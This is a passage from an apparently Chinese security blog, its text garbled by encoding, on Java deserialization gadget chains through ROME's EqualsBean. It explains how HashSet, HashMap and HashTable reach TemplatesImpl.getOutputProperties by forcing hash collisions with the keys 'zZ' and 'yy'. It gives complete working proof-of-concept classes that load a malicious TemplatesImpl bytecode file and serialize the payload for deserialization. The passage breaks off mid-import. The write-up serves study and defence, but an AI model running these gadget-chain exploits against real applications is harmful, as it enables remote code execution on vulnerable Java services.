<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€‚ç”¨äºjdk8&lt;8u191ï¼Œå¤§äºè¿™ä¸ªç‰ˆæœ¬è¯·è½¬é«˜ç‰ˆæœ¬ç»•è¿‡</p><h3 id="EqualsBeansé“¾"><a href="#EqualsBeansé“¾" class="headerlink" title="EqualsBeansé“¾"></a>EqualsBeansé“¾</h3><p>è§¦å‘ç‚¹åœ¨EqualsBeans.beanEqualsï¼Œé€‚ç”¨äºToStringBeanè¢«bançš„æƒ…å†µï¼ŒåŸç†è§1.2</p><p>åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject</span><br><span class="line">HashMap.put</span><br><span class="line">HashMap.putval</span><br><span class="line">HashMap.equals</span><br><span class="line">Abstractmap.equals</span><br><span class="line">EqualsBean.equals</span><br><span class="line">EqualsBean.beanEquals</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashTable.readObject(ObjectInputStream)</span><br><span class="line">HashTable.reconstitutionPut()</span><br><span class="line">HashMap.equals</span><br><span class="line">AbstractMap.equals</span><br><span class="line">EqualsBean.equals</span><br><span class="line">EqualsBean.beanEquals</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p>åŒç†èƒ½ç”¨LinkedHashSetå°è£…ï¼Œä¹Ÿå¯ä»¥beanEquals.equalsæ¥å‰é¢æåˆ°çš„é“¾å¥—å¨ƒ</p><h4 id="HashSet-or-HashMapé“¾"><a href="#HashSet-or-HashMapé“¾" class="headerlink" title="HashSet or HashMapé“¾"></a>HashSet or HashMapé“¾</h4><p>æˆ‘ä»¬æ„é€ åˆ°å»è§¦å‘hashMap.equalsæ—¶ï¼Œå‘ç°èµ°ä¸è¿›é‚£ä¸ªelse</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">fakeTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(Templates.class, templatesClass);</span><br><span class="line"><span class="comment">//        equalsBean.equals(fakeTemplates);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(fakeTemplates, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŸæ¥æ˜¯åœ¨ifåœä½äº†ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥çš„fakeTemplateså’ŒequalsBeanä¸æ˜¯åŒä¸€ç±»å‹ï¼Œåœ¨ifä¸­æŠŠç¬¬äºŒæ¬¡putçš„Entryæ’å…¥äº†å“ˆå¸Œè¡¨ï¼Œè€Œæ²¡å»elseåˆ¤æ–­äºŒè€…equals</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926113855845.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926113855845.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œå¾—ä½¿<code>p = tab[i = (n - 1) &amp; hash]</code>ï¼Œä¹Ÿå°±æ˜¯<code>(n-1)&amp;hash</code>æœ‰å…ƒç´ ï¼Œwhatï¼Œä¸å°±æ˜¯å‰åputçš„hash(key)ç›¸åŒå—</p><p>è«åæƒ³èµ·7u21è¿›è¡Œhashç¢°æ’ï¼Œå¯æƒœ7u80è¿›è¡Œäº†ä¿®å¤ï¼ŒAnnotationInvocationHandleråªèƒ½ä»£ç†Annotationç±»å‹ï¼Œé€‚ç”¨é¢å¾ˆçª„</p><p>å…ˆå‡è®¾ï¼Œæˆ‘ä»¬èƒ½èµ°åˆ°equalsæ–¹æ³•</p><p>hashMapå¹¶æ²¡æœ‰equalsæ–¹æ³•ï¼Œè°ƒç”¨çš„æ˜¯å…¶ç»§æ‰¿çš„æŠ½è±¡ç±»ï¼ŒAbstractMap.equals</p><p>æˆ‘ä»¬æ¥ä»”ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ï¼š</p><p>åˆ¤æ–­oæ˜¯å¦ä¸ºMapç±»å‹ï¼Œä¸æ˜¯åˆ™è¿”å›falseã€‚ç¡®è®¤ä¸¤è€…çš„å¤§å°æ˜¯å¦ç›¸åŒï¼Œä¸åŒåˆ™è¿”å›falseã€‚</p><p>éå†å½“å‰Mapçš„æ‰€æœ‰é”®å€¼å¯¹ï¼š</p><ul><li>å¦‚æœå½“å‰Map valueä¸ºnullï¼Œæ£€æŸ¥oä¸­çš„å¯¹åº”é”®æ˜¯å¦å­˜åœ¨ä¸”å…¶å€¼ä¹Ÿä¸ºnullã€‚</li><li>å¦‚æœå½“å‰Map valueä¸ä¸ºnullï¼Œåˆ™è°ƒç”¨value.equals(m.get(key))æ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ã€‚<br>æœ‰ä»»ä½•ä¸åŒ¹é…å³è¿”å›falseã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§è¿™ä¸ªAbstractMap.equalsæ˜¯ç”¨æ¥æ£€æŸ¥ä¸¤ä¸ªmapæ˜¯å¦ç›¸åŒçš„</p><p>æˆ‘ä»¬æ„é€ ä¸¤ä¸ªhashMapï¼Œä½¿value &#x3D; equalsBeanï¼Œm.get(key) &#x3D; fakeTemplatesï¼Œå°±èƒ½å®ç°åˆ©ç”¨é“¾ï¼Œæ³¨æ„putçš„å…ˆåé¡ºåºã€‚å…ˆputçš„ä½œä¸ºå‚æ•°oï¼ˆmï¼‰ï¼Œåputçš„ä½œä¸ºiã€‚ä¸”m.get(key)æ˜¯è¿”å›value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap1.put(<span class="number">1</span>, fakeTemplates);</span><br><span class="line">hashMap2.put(<span class="number">1</span>, equalsBean);</span><br><span class="line">hashMap.put(hashMap1, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">hashMap.put(hashMap2, <span class="string">&quot;godown&quot;</span>);</span><br></pre></td></tr></table></figure><p>é‚£æ€ä¹ˆèµ°è¿›elseå‘¢ï¼Œæˆ‘ä»¬æ„é€ ä¸¤ä¸ªçœ‹ä¸Šå»ç›¸åŒçš„hashMapï¼Œè¿™æ ·å¯ä»¥å—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap1.put(<span class="number">1</span>, fakeTemplates);</span><br><span class="line">hashMap1.put(<span class="number">1</span>, equalsBean);</span><br><span class="line">hashMap2.put(<span class="number">1</span>, fakeTemplates);</span><br><span class="line">hashMap2.put(<span class="number">1</span>, equalsBean);</span><br><span class="line">hashMap.put(hashMap1, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">hashMap.put(hashMap2, <span class="string">&quot;godown&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç­”æ¡ˆæ˜¯ä¸è¡Œï¼Œå› ä¸ºä¸¤æ¬¡ç›¸åŒçš„putä¼šåˆ·æ–°å€¼ï¼Œå¯¼è‡´åªå­˜åœ¨(1, equalsBean)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashMap1.put(<span class="number">1</span>, fakeTemplates);</span><br><span class="line">hashMap1.put(<span class="number">1</span>, equalsBean);</span><br></pre></td></tr></table></figure><p>éœ€è¦æœ‰ä¸¤ä¸ªhashå€¼ç›¸åŒçš„ï¼Œä½†æ˜¯æœ¬èº«ä¸åŒçš„ä½œä¸ºkeyï¼Œâ€yyâ€çš„hashå€¼ç­‰äºâ€zZâ€ï¼Œäºæ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap1.put(<span class="string">&quot;zZ&quot;</span>, fakeTemplates);</span><br><span class="line">hashMap1.put(<span class="string">&quot;yy&quot;</span>, equalsBean);</span><br><span class="line">hashMap2.put(<span class="string">&quot;zZ&quot;</span>, equalsBean);</span><br><span class="line">hashMap2.put(<span class="string">&quot;yy&quot;</span>, fakeTemplates);</span><br><span class="line">hashSet.add(hashMap1);</span><br><span class="line">hashSet.add(hashMap2);</span><br></pre></td></tr></table></figure><p>HashSet POCï¼šï¼ˆHashSetå¯æ”¹ä¸ºHashMapï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.Hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//HashSet.readObject</span></span><br><span class="line"><span class="comment">//HashMap.put</span></span><br><span class="line"><span class="comment">//HashMap.putval</span></span><br><span class="line"><span class="comment">//HashMap.equals</span></span><br><span class="line"><span class="comment">//AbastractMap.equals</span></span><br><span class="line"><span class="comment">//EqualsBean.equals</span></span><br><span class="line"><span class="comment">//EqualsBean.beanEquals</span></span><br><span class="line"><span class="comment">//TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_EqualsBeans</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">fakeTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">fakehashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(HashMap.class, fakehashMap);</span><br><span class="line"><span class="comment">//        equalsBean.equals(fakeTemplates);</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap1.put(<span class="string">&quot;zZ&quot;</span>, fakeTemplates);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>, equalsBean);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>, equalsBean);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>, fakeTemplates);</span><br><span class="line">        hashSet.add(hashMap1);</span><br><span class="line">        hashSet.add(hashMap2);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_beanClassField</span> <span class="operator">=</span> EqualsBean.class.getDeclaredField(<span class="string">&quot;_beanClass&quot;</span>);</span><br><span class="line">        _beanClassField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _beanClassField.set(equalsBean, Templates.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_objField</span> <span class="operator">=</span> EqualsBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        _objField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _objField.set(equalsBean, templatesClass);</span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HashTableé“¾-1"><a href="#HashTableé“¾-1" class="headerlink" title="HashTableé“¾"></a>HashTableé“¾</h4><p>ç”¨HashTable.reconstitutionPutè§¦å‘equals</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926185347607.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926185347607.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸€æ ·çš„hashç¢°æ’æ‰èƒ½è¿›forå¾ªç¯</p><p>HashTable POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> 